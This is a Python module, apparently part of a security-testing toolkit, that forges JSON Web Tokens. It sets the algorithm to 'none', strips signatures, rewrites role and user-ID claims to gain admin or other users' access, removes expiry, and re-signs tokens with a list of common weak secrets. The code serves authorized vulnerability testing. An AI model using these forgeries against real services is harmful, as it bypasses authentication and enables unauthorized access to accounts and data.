"""JWT token manipulation for vulnerability testing.

This module provides utilities for forging and modifying JWT tokens
to test for vulnerabilities like:
- Algorithm confusion ("none" algorithm)
- Weak signing keys
- Claim manipulation (privilege escalation)
- Missing expiration checks
"""

import base64
import hashlib
import hmac
import json
from typing import Any, Dict, Optional


class JWTForge:
    """Forge JWT tokens for vulnerability testing.

    Supports:
        - Removing signatures (algorithm confusion)
        - Changing algorithms to "none"
        - Modifying claims (role escalation)
        - Removing expiration
        - Testing weak signing keys
    """

    # Common weak secrets to test
    COMMON_SECRETS = [
        "",
        "secret",
        "password",
        "jwt",
        "token",
        "key",
        "secretkey",
        "your-256-bit-secret",
        "secret_key",
        "jwt-secret",
        "jsonwebtoken",
    ]

    # Common HMAC algorithms
    HMAC_ALGORITHMS = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }

    @staticmethod
    def decode(token: str, verify: bool = False) -> Dict[str, Any]:
        """Decode JWT token without verification.

        Args:
            token: JWT token string
            verify: If True, verify signature (not implemented)

        Returns:
            Dict with keys: header, payload, signature
        """
        parts = token.split(".")
        if len(parts) != 3:
            raise ValueError(f"Invalid JWT token: expected 3 parts, got {len(parts)}")

        header_b64, payload_b64, signature = parts

        # Add padding if needed
        header_b64 = JWTForge._add_padding(header_b64)
        payload_b64 = JWTForge._add_padding(payload_b64)

        try:
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))

            return {
                "header": header,
                "payload": payload,
                "signature": signature,
                "original": token,
            }
        except Exception as e:
            raise ValueError(f"Failed to decode JWT: {e}")

    @staticmethod
    def _add_padding(b64: str) -> str:
        """Add padding to base64 string if needed."""
        padding = 4 - len(b64) % 4
        if padding != 4:
            return b64 + "=" * padding
        return b64

    @staticmethod
    def _remove_padding(b64: str) -> str:
        """Remove padding from base64 string."""
        return b64.rstrip("=")

    @staticmethod
    def _encode(data: Dict[str, Any]) -> str:
        """URL-safe base64 encode JSON data."""
        json_str = json.dumps(data, separators=(",", ":"), sort_keys=True)
        return JWTForge._remove_padding(
            base64.urlsafe_b64encode(json_str.encode()).decode()
        )

    @staticmethod
    def change_algorithm(token: str, new_alg: str = "none") -> str:
        """Change the algorithm in the JWT header.

        Useful for testing algorithm confusion attacks where server
        accepts "none" algorithm without signature verification.

        Args:
            token: Original JWT token
            new_alg: New algorithm value (default: "none")

        Returns:
            Forged JWT token with new algorithm
        """
        decoded = JWTForge.decode(token)

        # Modify header
        decoded["header"]["alg"] = new_alg
        if "typ" in decoded["header"]:
            del decoded["header"]["typ"]  # Remove typ to be less suspicious

        # Encode new header
        new_header = JWTForge._encode(decoded["header"])
        payload_b64 = token.split(".")[1]

        # Return with no signature for "none" algorithm
        if new_alg.lower() == "none":
            return f"{new_header}.{payload_b64}."
        else:
            # Keep original signature (will be invalid but useful for testing)
            return f"{new_header}.{payload_b64}.{decoded['signature']}"

    @staticmethod
    def modify_claim(token: str, claim: str, value: Any) -> str:
        """Modify a claim in the JWT payload.

        Useful for testing privilege escalation (e.g., changing role to "admin").

        Args:
            token: Original JWT token
            claim: Claim name to modify
            value: New value for the claim

        Returns:
            Forged JWT token with modified claim
        """
        decoded = JWTForge.decode(token)

        # Modify payload
        decoded["payload"][claim] = value

        # Encode new parts
        new_header = token.split(".")[0]
        new_payload = JWTForge._encode(decoded["payload"])

        # Strip signature since we modified the payload
        return f"{new_header}.{new_payload}."

    @staticmethod
    def remove_expiration(token: str) -> str:
        """Remove expiration claim from JWT.

        Tests for missing expiration validation on the server.

        Args:
            token: Original JWT token

        Returns:
            JWT token without expiration claim
        """
        decoded = JWTForge.decode(token)

        # Remove exp and other time-based claims
        for claim in ["exp", "nbf", "iat"]:
            if claim in decoded["payload"]:
                del decoded["payload"][claim]

        # Encode new parts
        new_header = token.split(".")[0]
        new_payload = JWTForge._encode(decoded["payload"])

        return f"{new_header}.{new_payload}."

    @staticmethod
    def set_admin_role(token: str, role_claim: str = "role") -> str:
        """Set role claim to admin for privilege escalation test.

        Args:
            token: Original JWT token
            role_claim: Name of the role claim (default: "role")

        Returns:
            JWT token with admin role
        """
        return JWTForge.modify_claim(token, role_claim, "admin")

    @staticmethod
    def set_user_id(token: str, user_id: Any) -> str:
        """Set user ID claim for IDOR testing.

        Args:
            token: Original JWT token
            user_id: User ID to set

        Returns:
            JWT token with modified user ID
        """
        # Try common user ID claim names
        for claim in ["user_id", "userId", "sub", "id"]:
            decoded = JWTForge.decode(token)
            if claim in decoded["payload"]:
                return JWTForge.modify_claim(token, claim, user_id)

        # If none found, try user_id
        return JWTForge.modify_claim(token, "user_id", user_id)

    @staticmethod
    def sign_with_key(
        token: str,
        secret: str,
        algorithm: str = "HS256"
    ) -> str:
        """Sign a JWT token with a specific secret.

        Useful for testing weak secret vulnerabilities.

        Args:
            token: JWT token (can be unsigned or with different signature)
            secret: Secret key to sign with
            algorithm: HMAC algorithm to use

        Returns:
            JWT token signed with the specified secret
        """
        decoded = JWTForge.decode(token)

        # Update algorithm in header
        decoded["header"]["alg"] = algorithm

        # Encode header and payload
        header_b64 = JWTForge._encode(decoded["header"])
        payload_b64 = JWTForge._encode(decoded["payload"])

        # Create signature
        message = f"{header_b64}.{payload_b64}"
        hash_func = JWTForge.HMAC_ALGORITHMS.get(algorithm, hashlib.sha256)

        if algorithm.startswith("HS"):
            signature = hmac.new(
                secret.encode(),
                message.encode(),
                hash_func
            ).digest()
            signature_b64 = JWTForge._remove_padding(
                base64.urlsafe_b64encode(signature).decode()
            )
        else:
            # For other algorithms, just return unsigned
            signature_b64 = ""

        return f"{header_b64}.{payload_b64}.{signature_b64}"
